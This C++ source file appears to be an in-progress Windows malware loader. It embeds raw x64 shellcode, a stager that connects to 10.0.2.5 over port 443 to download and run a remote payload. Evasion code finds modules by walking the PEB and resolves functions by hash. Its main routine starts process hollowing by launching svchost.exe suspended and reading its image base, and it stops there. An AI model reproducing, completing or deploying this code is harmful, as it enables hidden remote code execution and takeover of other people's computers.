#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winternl.h>
#include <fstream>
#include <iostream>
#include <ctype.h>
#include <winhttp.h>
#include "getPEB.h"

//typedef HINTERNET(*_WinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
//typedef HINTERNET(*_WinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
//typedef BOOL(*_WinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);

typedef NTSTATUS(NTAPI* _NtQueryInformationProcess) (HANDLE ProcessHandle, DWORD ProcessInformationCLass, PVOID ProcessInformation, DWORD ProcessInformationLength, PWORD ReturnLength);

unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48"
"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x8b\x48\x18\x44\x8b\x40\x20\x50\x49"
"\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6"
"\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e"
"\x69\x6e\x65\x74\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c"
"\x77\x26\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31"
"\xc0\x4d\x31\xc9\x53\x53\x49\xba\x3a\x56\x79\xa7\x00\x00"
"\x00\x00\xff\xd5\xe8\x09\x00\x00\x00\x31\x30\x2e\x30\x2e"
"\x32\x2e\x35\x00\x5a\x48\x89\xc1\x49\xc7\xc0\xbb\x01\x00"
"\x00\x4d\x31\xc9\x53\x53\x6a\x03\x53\x49\xba\x57\x89\x9f"
"\xc6\x00\x00\x00\x00\xff\xd5\xe8\xbb\x00\x00\x00\x2f\x47"
"\x6e\x42\x4c\x77\x66\x43\x48\x30\x55\x50\x46\x30\x63\x54"
"\x54\x6f\x4d\x39\x46\x57\x77\x31\x64\x53\x54\x6e\x77\x46"
"\x62\x33\x33\x4f\x39\x70\x52\x55\x6f\x44\x67\x39\x34\x50"
"\x4f\x50\x70\x5f\x62\x63\x49\x56\x42\x66\x62\x65\x42\x37"
"\x58\x78\x46\x56\x6f\x32\x58\x4b\x42\x7a\x52\x42\x51\x39"
"\x74\x6a\x51\x30\x59\x61\x37\x38\x4a\x55\x48\x44\x6b\x4b"
"\x50\x71\x5a\x6b\x31\x4c\x4f\x58\x4b\x78\x74\x30\x4c\x6b"
"\x57\x4f\x43\x57\x77\x6e\x76\x61\x4c\x4f\x37\x33\x5f\x59"
"\x45\x36\x46\x52\x2d\x4c\x64\x30\x2d\x51\x35\x37\x55\x6a"
"\x39\x42\x33\x39\x65\x66\x6b\x50\x73\x4f\x67\x6f\x79\x75"
"\x4e\x71\x56\x63\x55\x55\x61\x65\x30\x6f\x6e\x66\x67\x30"
"\x41\x38\x34\x31\x33\x73\x74\x79\x79\x53\x63\x59\x55\x53"
"\x72\x73\x78\x66\x6e\x77\x57\x67\x65\x6d\x6f\x4a\x50\x63"
"\x41\x4b\x00\x48\x89\xc1\x53\x5a\x41\x58\x4d\x31\xc9\x53"
"\x48\xb8\x00\x32\xa8\x84\x00\x00\x00\x00\x50\x53\x53\x49"
"\xc7\xc2\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x6a\x0a\x5f"
"\x48\x89\xf1\x6a\x1f\x5a\x52\x68\x80\x33\x00\x00\x49\x89"
"\xe0\x6a\x04\x41\x59\x49\xba\x75\x46\x9e\x86\x00\x00\x00"
"\x00\xff\xd5\x4d\x31\xc0\x53\x5a\x48\x89\xf1\x4d\x31\xc9"
"\x4d\x31\xc9\x53\x53\x49\xc7\xc2\x2d\x06\x18\x7b\xff\xd5"
"\x85\xc0\x75\x1f\x48\xc7\xc1\x88\x13\x00\x00\x49\xba\x44"
"\xf0\x35\xe0\x00\x00\x00\x00\xff\xd5\x48\xff\xcf\x74\x02"
"\xeb\xaa\xe8\x55\x00\x00\x00\x53\x59\x6a\x40\x5a\x49\x89"
"\xd1\xc1\xe2\x10\x49\xc7\xc0\x00\x10\x00\x00\x49\xba\x58"
"\xa4\x53\xe5\x00\x00\x00\x00\xff\xd5\x48\x93\x53\x53\x48"
"\x89\xe7\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\x00\x20\x00"
"\x00\x49\x89\xf9\x49\xba\x12\x96\x89\xe2\x00\x00\x00\x00"
"\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb2\x66\x8b\x07\x48"
"\x01\xc3\x85\xc0\x75\xd2\x58\xc3\x58\x6a\x00\x59\x49\xc7"
"\xc2\xf0\xb5\xa2\x56\xff\xd5";

PPEB getPeb()
{
#if _WIN64
    return (PPEB)__readgsqword(0x60);
#else
    return (PPEB)__readfsdword(0x30);
#endif
}

wchar_t* convertCharArrayToLPCWSTR(const char* charArray)
{
    wchar_t* wString = new wchar_t[4096];
    MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
    return wString;
}

// hash
unsigned long DJB2hash(PWSTR functionName)
{
    unsigned long hash = 5381;
    unsigned int size = wcslen(functionName);
    unsigned int i = 0;
    for (i = 0; i < size; i++) {
        hash = ((hash << 5) + hash) + (functionName[i]);
    }
    return hash;
}

HMODULE getModuleHandleCustom(LPWSTR name)
{
    // Get the PEB 
    PPEB peb = getPeb(); 
    // Get the ldr of the PEB
    // Contains information about the loaded modules for the process.
    PPEB_LDR_DATA ldr = peb->Ldr;
    // The head of a doubly-linked list that contains the loaded modules for the process.
    // Each item in the list is a pointer to an LDR_DATA_TABLE_ENTRY structure
    PLIST_ENTRY listEntry = &ldr->InMemoryOrderModuleList;
    // For a LIST_ENTRY structure that serves as a list entry, 
    // the Flink member points to the next entry in the list or to the list header if there is no next entry in the list.
    PLIST_ENTRY ent = listEntry->Flink;
    // We are looping in the listEntry to get the address of the 
    do {
        //
        PLDR_DATA_TABLE_ENTRY tableEnt = (PLDR_DATA_TABLE_ENTRY)((PBYTE)ent - 0x10);
        LPWSTR nameDll = (LPWSTR)*tableEnt->Reserved5;
        //printf("nameDll : %ws\n", nameDll);
        //printf("name : %ws\n", name);
        if (lstrcmpW(name, nameDll) == 0)
            return (HMODULE)tableEnt->DllBase;
        ent = ent->Flink;
    } while (ent != listEntry);

    return nullptr;
}

PVOID getProcAddressCustom(PVOID dllAddress, DWORD functionHash)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllAddress;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((PBYTE)dllAddress + dosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER optionalHeader = &ntHeader->OptionalHeader;
    PIMAGE_DATA_DIRECTORY dataDir = &optionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dllAddress + dataDir->VirtualAddress);

    PDWORD AddressOfFunctions = (PDWORD)((PBYTE)dllAddress + exportDir->AddressOfFunctions);
    PDWORD AddressOfNames = (PDWORD)((PBYTE)dllAddress + exportDir->AddressOfNames);
    PWORD AddressOfFunctionsOrdinals = (PWORD)((PBYTE)dllAddress + exportDir->AddressOfNameOrdinals);

    //std::ofstream newHeader;
    //newHeader.open("getPEB.h");
    // Better with MemberOfFunctions
    for (int i = 0; i < exportDir->NumberOfFunctions; ++i)
    {
        PCSTR name = (PSTR)((PBYTE)dllAddress + AddressOfNames[i]);

        WORD ordinalName = (WORD)((PBYTE)dllAddress + AddressOfFunctionsOrdinals[i]);

        PVOID addr = (PVOID)((PBYTE)dllAddress + AddressOfFunctions[ordinalName]);

       //printf("%x\n", DJB2hash(convertCharArrayToLPCWSTR(name)));

       //newHeader << "#define " << name << "_HASH " << "0x" << DJB2hash(convertCharArrayToLPCWSTR(name)) << std::hex << std::endl;
       if (DJB2hash(convertCharArrayToLPCWSTR(name)) == functionHash)
       {
           return addr; 
       }
    }

    //newHeader.close();

    return nullptr;
}


int main()
{
    LPWSTR nameNtdll = convertCharArrayToLPCWSTR("ntdll.dll");
    HMODULE NtDllAddress = getModuleHandleCustom(nameNtdll);
    //HMODULE WinHttp = LoadLibrary(nameNtdll);

    // Lauch suspend process
    LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    LPSTARTUPINFOA si = new STARTUPINFOA();
    PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
    CreateProcessA("c:\\windows\\system32\\svchost.exe", 0, 0, 0, false, CREATE_SUSPENDED, NULL, NULL, si, pi);
    // Get the handle of the destination process
    HANDLE hProcess = pi->hProcess;
    LPVOID imageBaseAddr = NULL;
   
    // Get the offset location 
    DWORD NtStatus = 0;
    PWORD returnLength = 0;
    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    NtStatus = NtQueryInformationProcess(hProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), returnLength);
    DWORD64 pebImageBaseOffset = (DWORD64)pbi->PebBaseAddress + 0x10;

    // Get destination image base address
    SIZE_T bytesRead = NULL;
    ReadProcessMemory(hProcess, (LPCVOID)pebImageBaseOffset, &imageBaseAddr, sizeof(LPVOID), &bytesRead);

    //PVOID peHeaders = LocalAlloc()
   
    //printf("Address : %x", addressDll);

    //LPWSTR nametest = convertCharArrayToLPCWSTR("test");
    //PVOID functionAddress = getProcAddressCustom(NtDllAddress, NtAllocateVirtualMemory_HASH);
    //printf("address : %x", functionAddress);
    //printf("%x", DJB2hash(nametest));
}